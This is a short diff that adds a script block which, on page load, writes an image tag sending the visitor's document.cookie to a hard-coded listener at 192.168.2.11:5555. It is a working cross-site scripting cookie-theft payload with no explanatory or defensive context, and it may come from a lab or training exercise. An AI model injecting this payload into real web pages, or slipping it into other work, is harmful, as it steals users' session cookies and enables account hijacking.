@@ -1,0 +1,11 @@
+<script>
+  window.onload = function () {
+    let SERVER_IP = "192.168.2.11";
+    let SERVER_PORT = "5555";
+    document.write(
+      `<img src=http://${SERVER_IP}:${SERVER_PORT}?c=${escape(
+        document.cookie
+      )}>`
+    );
+  };
+</script>
